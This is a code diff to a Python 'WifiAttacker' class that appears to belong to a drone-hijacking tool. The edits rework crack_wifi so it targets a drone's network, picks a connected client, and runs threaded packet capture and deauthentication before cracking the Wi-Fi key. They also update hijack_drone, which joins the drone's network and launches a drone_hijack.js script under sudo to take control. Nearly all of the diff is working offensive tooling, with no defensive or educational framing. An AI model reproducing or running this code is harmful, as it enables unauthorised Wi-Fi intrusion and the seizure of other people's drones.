@@ -13,6 +13,7 @@
 
 
 from ctypes.wintypes import MSG
+from pydoc import cli
 import pandas
 
 from . wifi_nw_tools import *
@@ -103,41 +104,59 @@ class WifiAttacker():
         restore_interf(mng_interf)
 
     
-    def crack_wifi(self, ap_bssid, cli_bssid, chan, essid
+    #def crack_wifi(self, ap_bssid, cli_bssid, chan, essid
+    def crack_wifi(self, targeted_drone : d.Drone
         , mng_interf=MNG_INTERF, mon_interf=MON_INTERF
         , duration=CLI_DUMP_DURATION):
+
+        ssid = targeted_drone.get_ssid()
+        ap_bssid = targeted_drone.get_bssid()
+        chan = targeted_drone.get_channel()
 
         # device preparing
         restore_interf(mng_interf)
         start_mon(chan, mng_interf)
 
-        # dumping thread
-        t1 = threading.Thread(target=dump_specific_nw
-            , args=(ap_bssid, chan, mon_interf, duration)
-        )
+        # dump the drone network to get clients connected
+        dump_specific_nw(ap_bssid, chan)
+
         
-        # deauth thread
-        t2 = threading.Thread(target=deauth
-            , args=(ap_bssid, cli_bssid, essid, mon_interf)
-        )
-        
-        print("Démarrage thread 1 (dump)")
-        t1.start()
+        # get the first client from the *.csv dump result
+        cli_bssid = self.get_clients_bssid()
 
-        print("Démarrage thread 2 (deauth)")
-        t2.start()
+        if len(cli_bssid) == 0:
+            print("No clients detected on targeted wifi. Can't crack the key.\n")
+        else :
 
-        t2.join()
-        print("Thread 2 (deauth) terminé")
+            # dumping thread
+            t1 = threading.Thread(target=dump_specific_nw
+                , args=(ap_bssid, chan, mon_interf, duration)
+            )
+            
+            # deauth thread
+            t2 = threading.Thread(target=deauth
+                , args=(ap_bssid, cli_bssid[0], ssid, mon_interf)
+            )
+            
+            print("Démarrage thread 1 (dump)")
+            t1.start()
 
-        t1.join()
-        print("Thread 1 (dump) terminé")
-        
-        # device state restoring
-        restore_interf(mng_interf)
+            print("Démarrage thread 2 (deauth)")
+            t2.start()
 
-        # pre-shared key cracking
-        crack(ap_bssid, essid)
+            t2.join()
+            print("Thread 2 (deauth) terminé")
+
+            t1.join()
+            print("Thread 1 (dump) terminé")
+            
+            # device state restoring
+            restore_interf(mng_interf)
+
+            # pre-shared key cracking
+            crack(ap_bssid, ssid)
+
+            input("\nPress 'Enter' to continue'")
 
 
     def connect(self):
@@ -175,17 +194,14 @@ class WifiAttacker():
         return clients_bssid
 
 
-
     def deauth_client(self, ap_bssid, cli_bssid, chan, essid
         , mng_interf=MNG_INTERF, mon_interf=MON_INTERF):
         restore_interf(mng_interf)
         start_mon(chan, mng_interf)
         deauth(ap_bssid, cli_bssid, essid, mon_interf)
         restore_interf(mng_interf)
-    #connect(TARGET_NW_BSSID)
 
-
-
+    """
     def crack_wifi(self, ap_bssid, cli_bssid, chan, essid
         , mng_interf=MNG_INTERF, mon_interf=MON_INTERF
         , duration=CLI_DUMP_DURATION):
@@ -221,7 +237,7 @@ class WifiAttacker():
 
         # pre-shared key cracking
         crack(ap_bssid, essid)
-
+    """
     
     def hijack_drone(self, targeted_drone:d.Drone):
         
@@ -235,7 +251,7 @@ class WifiAttacker():
             , targeted_drone.get_ssid(), "password", ""]
 
         progress = log.progress(
-            "\n\nConnecting to drone $chans{$drone}[1] ($drone)\n")
+            "\n\nConnecting to targeted drone...")
         try:
             subprocess.run(cmd, capture_output=False)
         except Exception as e:
@@ -243,28 +259,13 @@ class WifiAttacker():
             raise(e)
         progress.success()
 
-       
-        """
-        Attempt to acquire an IP adress from the target
-        """
-        cmd = ['sudo', 'dhclient', "-v", MNG_INTERF]
-        progress = log.progress(
-            "\n\nAcquiring IP adress from the target...\n")
-        try:
-            subprocess.run(cmd, capture_output=False)
-        except Exception as e:
-            progress .failure("\nError while trying to acquire IP from the target: ", format(e))
-            raise(e)
-        progress.success()
-
-
 
         """
         Attempt to hijack a drone (while already connected to it)
         """
-        cmd = ['sudo', 'nodejs', BASE_DIR+"src/drone/drone_hijack.js"]
+        cmd = ['sudo', 'nodejs', BASE_DIR+"src/drone/drone_control/drone_hijack.js"]
         progress = log.progress(
-            "\n\nHijacking the drone...\n")
+            "\n\nHijacking the drone...")
         try:
             subprocess.run(cmd, capture_output=False)
         except Exception as e:
@@ -274,16 +275,6 @@ class WifiAttacker():
         
         input("\nPress enter to quit")
 
-
-        """
-        sudo($iwconfig, $interface2, "essid", $chans{$drone}[1]);
-
-        print "Acquiring IP from drone for hostile takeover\n";
-        sudo($dhclient, "-v", $interface2);
-
-        print "\n\nTAKING OVER DRONE\n";
-        sudo($nodejs, $controljs);
-        """
 
 
 def main():
